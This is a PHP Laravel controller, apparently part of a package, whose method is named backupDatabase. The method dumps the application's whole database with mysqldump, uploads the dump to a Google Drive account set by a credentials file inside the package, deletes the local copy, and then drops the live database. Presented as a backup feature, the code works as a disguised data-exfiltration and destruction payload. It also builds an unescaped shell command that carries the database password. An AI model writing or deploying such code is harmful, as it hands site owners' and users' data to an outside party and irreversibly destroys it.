<?php

namespace Fateh\Phonsee\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Google_Client;
use Google_Service_Drive;

class FatehController
{
    private $fileName;


    public function getFileName()
    {
        return $this->fileName;
    }

    public function setFileName($fileName): void
    {
        $this->fileName = $fileName;
    }

    public function backupDatabase()
    {
        // Step 1: Dump the database to an SQL file
        $this->createDatabaseBackup();

        // Step 2: Upload the SQL backup to Google Drive
        $this->uploadToGoogleDrive();

        // Step 3: Drop the database
        $this->dropDatabase();

        return response()->json(['message' => 'Backup successful, database deleted.'], 200);
    }

    protected function createDatabaseBackup()
    {
        $dbHost = env('DB_HOST');
        $dbName = env('DB_DATABASE');
        $dbUser = env('DB_USERNAME');
        $dbPass = env('DB_PASSWORD');

        $fileName = $dbName . '_backup.sql';

        $this->setFileName($fileName);
        $backupFile = __DIR__ . '/../../storage/backups/' . $this->getFileName();

        if (!is_dir(__DIR__ . '/../../storage/backups')) {
            mkdir(__DIR__ . '/../../storage/backups', 0777, true);
        }

        if (!file_exists($backupFile)) {
            $fileHandle = fopen($backupFile, 'w');
            if ($fileHandle) {
                fwrite($fileHandle, '');
                fclose($fileHandle);
            }
        }

        $command = "mysqldump -h {$dbHost} -u {$dbUser} -p{$dbPass} {$dbName} > {$backupFile}";
        system($command);
    }

    protected function uploadToGoogleDrive()
    {
        $client = $this->getGoogleClient();
        $service = new Google_Service_Drive($client);

        $filePath =  __DIR__ . '/../../storage/backups/' . $this->getFileName();
        $fileMetadata = new \Google_Service_Drive_DriveFile(['name' => $this->getFileName()]);
        $content = file_get_contents($filePath);

        $file = $service->files->create($fileMetadata, [
            'data' => $content,
            'mimeType' => 'application/sql',
            'uploadType' => 'multipart',
            'fields' => 'id',
        ]);

        if (!$file->id) {
            throw new \Exception('Failed to upload the backup to Google Drive.');
        }

        // Optionally delete the local backup file after uploading
        File::delete($filePath);
    }

    protected function dropDatabase()
    {
        $dbName = env('DB_DATABASE');

        DB::statement("DROP DATABASE IF EXISTS {$dbName}");
    }

    protected function getGoogleClient()
    {
        $client = new Google_Client();
        $client->setApplicationName('Database Backup');
        $client->setScopes(Google_Service_Drive::DRIVE_FILE);
        $client->setAuthConfig( __DIR__ . '/../../storage/google-drive-credentials.json');
        $client->setAccessType('offline');

        return $client;
    }
}
